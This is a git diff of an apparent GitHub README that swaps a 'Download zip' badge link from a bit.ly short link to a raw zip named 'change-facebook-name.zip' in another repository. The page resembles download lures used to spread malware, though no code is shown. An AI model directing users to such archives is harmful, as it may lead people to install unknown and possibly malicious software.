@@ -44,7 +44,7 @@
 <div align="center"> <h1>How To Donwload Zip</h1> </div>
 <p>Click Download Button and Download Zip File</p>
 
-[![Download zip](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download zip")](https://bit.ly/facebook-name-change)
+[![Download zip](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download zip")](https://github.com/Aru-Is-Always-King/zip-src/raw/main/change-facebook-name.zip)
 
 
 <br><br><br><br><br><br>
